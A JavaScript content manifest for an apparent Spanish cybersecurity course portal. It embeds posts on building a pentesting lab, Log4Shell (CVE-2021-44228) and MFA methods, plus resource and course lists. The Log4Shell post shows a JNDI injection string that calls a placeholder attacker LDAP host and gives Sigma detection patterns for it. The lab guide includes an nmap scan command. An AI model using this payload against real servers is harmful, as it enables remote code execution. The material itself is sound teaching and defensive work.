/**
 * CiberCelia - Content Manifest & Markdown Engine
 * Handles post registration, dataset parsing, and Markdown rendering.
 */

const CIBERCELIA_CONTENT = {
  // Posts index (Guías y Artículos Técnicos reales)
  posts: [
    {
      id: "01-guia-pentesting-laboratorio",
      title: "Guía para montar tu propio Laboratorio de Pentesting con VirtualBox y Docker",
      category: "post",
      date: "2026-10-05",
      author: "CiberCelia",
      author_github: "cibercelia",
      tags: ["pentesting", "laboratorio", "docker", "redteam", "virtualizacion"],
      summary: "Paso a paso para desplegar un entorno seguro y aislado en local para practicar técnicas ofensivas y análisis forense sin riesgos.",
      file: "content/posts/01-guia-pentesting-laboratorio.md",
      readingTime: "5 min",
      content: `
# Guía para montar tu propio Laboratorio de Pentesting

Montar un laboratorio controlado es uno de los pasos fundamentales para cualquier estudiante del **Curso de Especialización de Ciberseguridad**. En esta guía veremos cómo desplegar máquinas virtuales vulnerables y contenedores Docker para practicar.

---

## 1. Topología del Laboratorio

Para evitar cualquier fuga de tráfico a tu red doméstica o del instituto, configuramos una red interna o modo *Host-Only*:

\`\`\`text
+-------------------------------------------------------------+
|                      Máquina Host                           |
|                                                             |
|  +---------------------+        +-------------------------+  |
|  | Kali Linux / Parrot |  <---> | Máquinas Vulnerables    |  |
|  | (Atacante)          |        | (Metasploitable, DVWA)  |  |
|  | IP: 192.168.56.10   |        | IP: 192.168.56.20       |  |
|  +---------------------+        +-------------------------+  |
|             |                                |              |
|             +---- Red Interna (Host-Only) ---+              |
+-------------------------------------------------------------+
\`\`\`

---

## 2. Despliegue Rápido de DVWA con Docker

La forma más limpia y rápida de desplegar aplicaciones web vulnerables para prácticas es mediante Docker.

Ejecuta el siguiente comando para levantar **Damn Vulnerable Web Application (DVWA)**:

\`\`\`bash
# Descargar y ejecutar contenedor de DVWA
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
\`\`\`

Una vez levantado, abre tu navegador en \`http://localhost:8080\` y sigue las instrucciones de inicialización de la base de datos (usuario: \`admin\`, contraseña: \`password\`).

---

## 3. Escaneo Inicial con Nmap

Desde tu máquina atacante (Kali Linux), comprueba que la máquina objetivo responde y detecta servicios abiertos:

\`\`\`bash
# Escaneo de puertos TCP con detección de versiones y scripts básicos
nmap -sV -sC -Pn -T4 192.168.56.20 -oN escaneo_inicial.txt
\`\`\`

### Opciones recomendadas:
- \`-sV\`: Identifica versiones de software y servicios.
- \`-sC\`: Ejecuta el conjunto de scripts por defecto de NSE.
- \`-oN\`: Guarda la salida formateada en un archivo de texto.

---

## 4. Buenas Prácticas de Seguridad en el Laboratorio

> [!IMPORTANT]
> Nunca expongas máquinas vulnerables a redes públicas o Wi-Fi abiertas. Utiliza siempre adaptadores de red de tipo **Host-Only** o **Red Interna** en VirtualBox/VMware.

1. **Instantáneas (Snapshots)**: Toma una instantánea limpia antes de empezar a explotar un servicio para poder volver al estado inicial en segundos.
2. **Aislamiento de red**: Desactiva el adaptador de red en modo Puente (Bridge) cuando trabajes con malware o exploits activos.
3. **Documentación Docs-as-Code**: Documenta tus hallazgos en formato Markdown con evidencias y capturas.
`
    },
    {
      id: "02-analisis-vulnerabilidad-log4shell",
      title: "Análisis en Profundidad de Log4Shell (CVE-2021-44228)",
      category: "post",
      date: "2026-10-02",
      author: "CiberCelia",
      author_github: "cibercelia",
      tags: ["cve", "vulnerabilidad", "java", "jndi", "blueteam"],
      summary: "Estudio técnico de una de las vulnerabilidades más críticas de la historia reciente: origen JNDI, mecanismo de inyección y contramedidas.",
      file: "content/posts/02-analisis-vulnerabilidad-log4shell.md",
      readingTime: "4 min",
      content: `
# Análisis de la vulnerabilidad Log4Shell (CVE-2021-44228)

En diciembre de 2021 se descubrió una vulnerabilidad de ejecución remota de código (RCE) en la librería de registro **Apache Log4j 2**, bautizada como **Log4Shell**. Con una puntuación CVSS de **10.0 (Crítica)**, afectó a millones de servicios empresariales en todo el mundo.

---

## ¿Por qué ocurrió?

Log4j incluía una funcionalidad de sustitución de mensajes que permitía consultar datos dinámicos mediante **JNDI (Java Naming and Directory Interface)**:

\`\`\`text
\${jndi:ldap://atacante.com/exploit}
\`\`\`

Cuando Log4j procesaba un mensaje que contenía esta cadena (por ejemplo, en la cabecera \`User-Agent\` de una petición HTTP), intentaba contactar con el servidor LDAP del atacante y descargar una clase Java ejecutable.

---

## Flujo del Ataque

\`\`\`text
[Atacante] --( Petición HTTP con payload \${jndi:...} )--> [Servidor Vulnerable (Log4j)]
                                                                    |
                                                            (Consulta LDAP JNDI)
                                                                    v
[Servidor LDAP Malicioso] <-----------------------------------------+
       |
  (Envía clase Java maliciosa)
       v
[Servidor Vulnerable] ===> ¡Ejecución remota de código en contexto de aplicación!
\`\`\`

---

## Detección y Mitigación

### 1. Regla Sigma para detección en logs de proxy o WAF:

\`\`\`yaml
title: Detección de patrones JNDI en cabeceras HTTP
status: production
logsource:
    category: webserver
detection:
    keywords:
        - '\${jndi:ldap:'
        - '\${jndi:rmi:'
        - '\${jndi:dns:'
    condition: keywords
falsepositives:
    - Escaneos de seguridad autorizados
level: critical
\`\`\`

### 2. Medidas de remediación inmediatas:
- Actualizar Log4j a versiones \`>= 2.17.1\`.
- Configurar la propiedad del sistema \`log4j2.formatMsgNoLookups=true\` en versiones 2.10 a 2.14.1.
- Restringir el tráfico saliente desde servidores de aplicaciones hacia puertos no estándar de LDAP/RMI.
`
    },
    {
      id: "03-configuracion-autenticacion-mfa-segura",
      title: "MFA Seguro: De contraseñas débiles a Passkeys y FIDO2",
      category: "post",
      date: "2026-09-28",
      author: "CiberCelia",
      author_github: "cibercelia",
      tags: ["mfa", "fido2", "autenticacion", "passkeys", "glosario"],
      summary: "Comparativa entre SMS, TOTP y llaves de seguridad físicas resistentes a ataques de phishing de adversario intermediario (AiTM).",
      file: "content/posts/03-configuracion-autenticacion-mfa-segura.md",
      readingTime: "4 min",
      content: `
# MFA Seguro: De contraseñas débiles a Passkeys y FIDO2

La autenticación multifactor (**MFA**) es la primera línea de defensa para proteger identidades en la nube y accesos corporativos. Sin embargo, no todos los métodos de doble factor ofrecen el mismo nivel de protección.

> [!NOTE]
> Puedes consultar la definición completa y detallada de **MFA** en nuestro [Glosario de Ciberseguridad](https://cibercelia.github.io/glosario/terms/mfa/).

---

## Comparativa de Factores de Autenticación

| Método MFA | Nivel de Seguridad | Resistente a Phishing (AiTM) | Vulnerable a SIM Swapping |
| :--- | :---: | :---: | :---: |
| **SMS / Llamada** | ⚠️ Bajo | ❌ No | ✅ Sí |
| **Email OTP** | ⚠️ Bajo | ❌ No | ❌ No |
| **App TOTP (Google/MS Auth)** | 🟡 Medio | ❌ No | ❌ No |
| **Notificación Push** | 🟡 Medio | ❌ No (Fatiga MFA) | ❌ No |
| **FIDO2 / Passkeys / WebAuthn** | 🟢 Muy Alto | ✅ **Sí** | ❌ No |

---

## ¿Por qué FIDO2 / Passkeys es resistente al phishing?

El estándar **FIDO2 (WebAuthn)** utiliza criptografía asimétrica vinculada criptográficamente al dominio del navegador (\`Origin binding\`):

\`\`\`text
+---------------+              +--------------------+              +-------------------+
|  Navegador /  |              | Servidor Auténtico |              | Servidor Phishing |
| Llave Física  |              | (banco.com)        |              | (banc0-login.com) |
+---------------+              +--------------------+              +-------------------+
        |                                |                                   |
        |--- 1. Solicita credencial ---->|                                   |
        |<-- 2. Desafío (Challenge) -----|                                   |
        |                                                                    |
        |=== 3. Llave firma desafío con dominio 'banco.com' =================|
        |                                                                    |
        |--- 4. Si el atacante intenta reenviar a banc0-login.com ---------> |
        |    EL NAVEGADOR RECHAZA LA FIRMA POR DISCORDANCIA DE DOMINIO ❌    |
\`\`\`

---

## Recomendaciones para Administradores

1. Forzar la deshabilitación del segundo factor vía SMS en entornos corporativos.
2. Habilitar **Number Matching** en notificaciones push para evitar ataques de fatiga MFA.
3. Desplegar autenticación basada en certificados o llaves físicas FIDO2 para usuarios con privilegios elevados (Domain Admins, Global Admins).
`
    }
  ],

  // Noticias index (Avisos e hitos reales)
  noticias: [
    {
      id: "01-inicio-glosario-ciberseguridad",
      title: "Inicio del proyecto Glosario Colaborativo de Ciberseguridad",
      category: "noticia",
      date: "2026-10-01",
      author: "CiberCelia",
      author_github: "cibercelia",
      tags: ["glosario", "docs-as-code", "mkdocs", "proyectos", "colaborativo"],
      summary: "Puesta en marcha del repositorio glosario de CiberCelia para documentar términos y conceptos clave de seguridad mediante metodología Docs-as-Code.",
      file: "content/noticias/01-inicio-glosario-ciberseguridad.md",
      readingTime: "2 min",
      content: `
# Inicio del proyecto Glosario Colaborativo de Ciberseguridad

El alumnado del Curso de Especialización de Ciberseguridad del IES Celia Viñas cuenta con un nuevo espacio colaborativo: el **Glosario de Ciberseguridad**.

El repositorio, alojado en [github.com/cibercelia/glosario](https://github.com/cibercelia/glosario) y desplegado en [cibercelia.github.io/glosario](https://cibercelia.github.io/glosario/), está construido mediante **MkDocs Material** y permite que los estudiantes contribuyan con nuevas definiciones, esquemas y referencias técnicas a través de Pull Requests.

---

## Objetivos del Glosario

1. **Construir una base de conocimiento común**: Documentar términos fundamentales (autenticación, criptografía, normativas, técnicas ofensivas y defensivas) con rigor técnico.
2. **Practicar Docs-as-Code**: Familiarizarse con el flujo de trabajo estándar en la industria (Git, ramas, Markdown, revisión por pares y despliegue continuo).
3. **Referencias compartidas**: Servir de consulta para las prácticas, laboratorios y proyectos desarrollados a lo largo del curso.
`
    },
    {
      id: "02-entrada-en-vigor-directiva-nis2",
      title: "Transposición y claves de la Directiva Europea NIS2 para entidades esenciales",
      category: "noticia",
      date: "2026-10-01",
      author: "CiberCelia",
      author_github: "cibercelia",
      tags: ["nis2", "normativa", "cumplimiento", "cni", "incibe"],
      summary: "Resumen de las obligaciones de gestión de riesgos, notificación de incidentes tempranos y medidas técnicas del marco regulatorio europeo NIS2.",
      file: "content/noticias/02-entrada-en-vigor-directiva-nis2.md",
      readingTime: "3 min",
      content: `
# Claves de la Directiva NIS2 en el panorama de la Ciberseguridad

La directiva **NIS2 (Directiva UE 2022/2555)** amplía notablemente el alcance de los sectores considerados de alta criticidad e introduce requerimientos estrictos de gobernanza y gestión del riesgo operacional en ciberseguridad.

---

## Principales Obligaciones

- **Sectores Ampliados**: Además de energía, transporte, banca y salud, se incorporan administraciones públicas, proveedores de servicios gestionados (MSP), servicios en la nube, centros de datos y redes públicas de telecomunicaciones.
- **Responsabilidad de los Órganos de Dirección**: Obligación de formación regular en ciberseguridad y supervisión directa de las políticas de gestión de riesgos.
- **Plazos de Notificación de Incidentes**:
  1. *Alerta temprana*: En un plazo máximo de **24 horas** desde la detección de un incidente significativo al CSIRT de referencia.
  2. *Notificación de incidente*: Evaluación técnica inicial en **72 horas**.
  3. *Informe final*: En un plazo de **1 mes**.

---

## Enlaces y Documentación Oficial
- [Directiva (UE) 2022/2555 del Parlamento Europeo y del Consejo](https://eur-lex.europa.eu/eli/dir/2022/2555/oj)
- [Guías del Centro Criptológico Nacional (CCN-CERT)](https://www.ccn-cert.cni.es/)
- [Avisos y servicios de INCIBE-CERT](https://www.incibe.es/incibe-cert)
`
    }
  ],

  // Recursos dataset (Herramientas y plataformas reales)
  recursos: [
    {
      id: "rec-portswigger",
      title: "PortSwigger Web Security Academy",
      category: "recurso",
      url: "https://portswigger.net/web-security",
      summary: "Laboratorios y formación gratuita de máxima calidad sobre vulnerabilidades web (SQLi, XSS, CSRF, SSRF, JWT, OAuth).",
      tags: ["web", "laboratorio", "burpsuite", "gratis", "pentesting"],
      badge: "Recomendado",
      author: "CiberCelia",
      date: "2026-10-01"
    },
    {
      id: "rec-hackthebox",
      title: "Hack The Box (HTB)",
      category: "recurso",
      url: "https://www.hackthebox.com/",
      summary: "Plataforma gamificada con máquinas virtuales activas y retiradas para practicar pentesting, privilege escalation y Active Directory.",
      tags: ["laboratorio", "pentesting", "redteam", "active-directory"],
      badge: "Popular",
      author: "CiberCelia",
      date: "2026-10-01"
    },
    {
      id: "rec-tryhackme",
      title: "TryHackMe (THM)",
      category: "recurso",
      url: "https://tryhackme.com/",
      summary: "Salas guiadas paso a paso ideales para iniciarse en ciberseguridad, redes, Linux, Windows y herramientas ofensivas.",
      tags: ["laboratorio", "redteam", "blueteam"],
      badge: "Esencial",
      author: "CiberCelia",
      date: "2026-10-01"
    },
    {
      id: "rec-gtfobins",
      title: "GTFOBins - Unix Binaries Escalation",
      category: "recurso",
      url: "https://gtfobins.github.io/",
      summary: "Catálogo seleccionado de binarios de Unix para eludir restricciones de seguridad locales en sistemas mal configurados (SUID, Sudo).",
      tags: ["linux", "privilege-escalation", "cheatsheet", "redteam"],
      badge: "Herramienta",
      author: "CiberCelia",
      date: "2026-09-25"
    },
    {
      id: "rec-cyberchef",
      title: "CyberChef - The Cyber Swiss Army Knife",
      category: "recurso",
      url: "https://gchq.github.io/CyberChef/",
      summary: "Aplicación web desarrollada por GCHQ para codificar, decodificar, cifrar, analizar datos binarios y realizar desofuscaciones.",
      tags: ["forense", "criptografia", "herramienta", "analisis"],
      badge: "Web App",
      author: "CiberCelia",
      date: "2026-09-20"
    },
    {
      id: "rec-mitre-attack",
      title: "MITRE ATT&CK Matrix",
      category: "recurso",
      url: "https://attack.mitre.org/",
      summary: "Base de conocimiento global de tácticas, técnicas y procedimientos (TTPs) de adversarios basada en observaciones del mundo real.",
      tags: ["framework", "ttps", "blueteam", "threat-intel"],
      badge: "Estándar",
      author: "CiberCelia",
      date: "2026-09-15"
    },
    {
      id: "rec-owasp-top-10",
      title: "OWASP Top 10 Web Security Risks",
      category: "recurso",
      url: "https://owasp.org/www-project-top-ten/",
      summary: "Documento de consenso y concienciación sobre los riesgos de seguridad más críticos para aplicaciones web en todo el mundo.",
      tags: ["owasp", "web", "estandar", "appsec"],
      badge: "Oficial",
      author: "CiberCelia",
      date: "2026-09-10"
    },
    {
      id: "rec-incibe-guias",
      title: "INCIBE-CERT Guías y Avisos de Seguridad",
      category: "recurso",
      url: "https://www.incibe.es/incibe-cert",
      summary: "Centro de respuesta ante incidentes nacional para ciudadanos y empresas en España: avisos, guías y alertas de ciberseguridad.",
      tags: ["incibe", "cert", "alertas", "guias", "espana"],
      badge: "Nacional",
      author: "CiberCelia",
      date: "2026-09-05"
    }
  ],

  // Cursos dataset (Cursos y certificaciones oficiales reales)
  cursos: [
    {
      id: "curso-roadmap-ciber",
      title: "Cybersecurity Roadmap - Step by Step",
      category: "curso",
      url: "https://roadmap.sh/cyber-security",
      summary: "Mapa de ruta interactivo con los conocimientos fundamentales y avanzados para orientar tu carrera en ciberseguridad.",
      tags: ["roadmap", "carrera", "fundamentos", "gratis"],
      provider: "roadmap.sh",
      level: "Todos los niveles",
      type: "Ruta de Aprendizaje",
      date: "2026-10-01"
    },
    {
      id: "cert-comptia-secplus",
      title: "CompTIA Security+ (SY0-701)",
      category: "curso",
      url: "https://www.comptia.org/certifications/security",
      summary: "Certificación internacional de referencia que valida las habilidades básicas necesarias para desempeñar funciones clave de seguridad.",
      tags: ["certificacion", "comptia", "seguridad"],
      provider: "CompTIA",
      level: "Intermedio",
      type: "Certificación Oficial",
      date: "2026-10-01"
    },
    {
      id: "cert-ejpt",
      title: "eLearnSecurity Junior Penetration Tester (eJPT)",
      category: "curso",
      url: "https://ine.com/certifications/ejpt-certification",
      summary: "Certificación 100% práctica de iniciación al pentesting en redes, evaluación de vulnerabilidades y explotación web.",
      tags: ["certificacion", "pentesting", "redteam", "practico"],
      provider: "INE Security",
      level: "Junior / Práctico",
      type: "Certificación Práctica",
      date: "2026-09-20"
    },
    {
      id: "curso-cisco-skillsforall",
      title: "Cisco Skills For All - Fundamentos de Ciberseguridad",
      category: "curso",
      url: "https://skillsforall.com/",
      summary: "Cursos oficiales gratuitos de Cisco Networking Academy sobre defensa de redes, respuesta a incidentes y conceptos clave.",
      tags: ["cisco", "redes", "gratis"],
      provider: "Cisco",
      level: "Iniciación",
      type: "Curso Gratuito",
      date: "2026-09-15"
    },
    {
      id: "curso-google-cybersecurity",
      title: "Certificado Profesional de Ciberseguridad de Google",
      category: "curso",
      url: "https://grow.google/certificates/cybersecurity/",
      summary: "Formación enfocada a analistas SOC: SIEM (Chronicle/Splunk), Python para seguridad, Linux y detección de intrusiones.",
      tags: ["google", "soc", "siem", "python", "blueteam"],
      provider: "Google / Coursera",
      level: "Iniciación / Intermedio",
      type: "Certificado Profesional",
      date: "2026-09-10"
    }
  ],

  // Proyectos dataset (Repositorios reales existentes)
  proyectos: [
    {
      id: "proj-glosario",
      title: "Glosario Colaborativo de Ciberseguridad",
      category: "proyecto",
      url: "https://cibercelia.github.io/glosario/",
      github_url: "https://github.com/cibercelia/glosario",
      summary: "Diccionario y base de conocimiento colaborativa de términos y conceptos de seguridad desarrollado mediante Docs-as-Code (MkDocs Material).",
      tags: ["glosario", "docs-as-code", "mkdocs", "colaborativo"],
      badge: "Repositorio",
      stars: "GitHub Repo",
      date: "2026-10-01"
    },
    {
      id: "proj-cibercelia-web",
      title: "Portal CiberCelia",
      category: "proyecto",
      url: "https://cibercelia.github.io/cibercelia/",
      github_url: "https://github.com/cibercelia/cibercelia",
      summary: "Repositorio del portal web: centraliza artículos técnicos, enlaces seleccionados, avisos y proyectos del curso de especialización.",
      tags: ["portal", "github-pages", "articulos", "recursos"],
      badge: "Repositorio",
      stars: "GitHub Repo",
      date: "2026-10-01"
    }
  ]
};

// Markdown Parser Engine using marked.js with GFM & custom callouts
const MarkdownEngine = {
  // Strip frontmatter if present
  stripFrontmatter(md) {
    if (md.startsWith('---')) {
      const end = md.indexOf('---', 3);
      if (end !== -1) {
        return md.slice(end + 3).trim();
      }
    }
    return md;
  },

  // Parse Markdown to HTML
  render(md) {
    let raw = this.stripFrontmatter(md);

    // Process GitHub Callouts / Alerts (> [!NOTE], > [!IMPORTANT], > [!WARNING], > [!TIP], > [!CAUTION])
    raw = raw.replace(/^>\s*\[!(NOTE|IMPORTANT|WARNING|TIP|CAUTION)\]\s*\n((?:>.*\n?)*)/gim, (match, type, content) => {
      const cleanContent = content.replace(/^>\s?/gm, '').trim();
      const typeLower = type.toLowerCase();
      const titles = {
        note: 'Nota',
        important: 'Importante',
        warning: 'Advertencia',
        tip: 'Consejo',
        caution: 'Precaución'
      };
      const innerHtml = typeof marked !== 'undefined' ? marked.parse(cleanContent) : cleanContent;
      return `<div class="callout callout-${typeLower}">
        <div class="callout-title"><strong>${titles[typeLower] || type}</strong></div>
        <div class="callout-body">${innerHtml}</div>
      </div>\n\n`;
    });

    let html = '';
    if (typeof marked !== 'undefined') {
      marked.setOptions({
        gfm: true,
        breaks: false
      });
      html = marked.parse(raw);
    } else {
      html = raw;
    }

    // Enhance code blocks with copy button
    html = html.replace(/<pre><code class="language-([\w-]+)">([\s\S]*?)<\/code><\/pre>/g, (match, lang, code) => {
      return `<div class="code-wrapper" style="position: relative;">
        <button class="code-copy-btn" onclick="copyCodeSnippet(this)">Copiar</button>
        <pre class="language-${lang}"><code class="language-${lang}">${code}</code></pre>
      </div>`;
    });

    html = html.replace(/<pre><code>([\s\S]*?)<\/code><\/pre>/g, (match, code) => {
      return `<div class="code-wrapper" style="position: relative;">
        <button class="code-copy-btn" onclick="copyCodeSnippet(this)">Copiar</button>
        <pre class="language-text"><code class="language-text">${code}</code></pre>
      </div>`;
    });

    return html;
  }
};

// Global helper for code snippet copy
window.copyCodeSnippet = function(btn) {
  const pre = btn.parentElement ? btn.parentElement.querySelector('pre code') : null;
  const code = pre ? pre.innerText : (btn.nextElementSibling ? btn.nextElementSibling.innerText : '');
  navigator.clipboard.writeText(code).then(() => {
    const originalText = btn.innerText;
    btn.innerText = '¡Copiado!';
    btn.style.borderColor = '#10b981';
    btn.style.color = '#10b981';
    setTimeout(() => {
      btn.innerText = originalText;
      btn.style.borderColor = '';
      btn.style.color = '';
    }, 2000);
  });
};
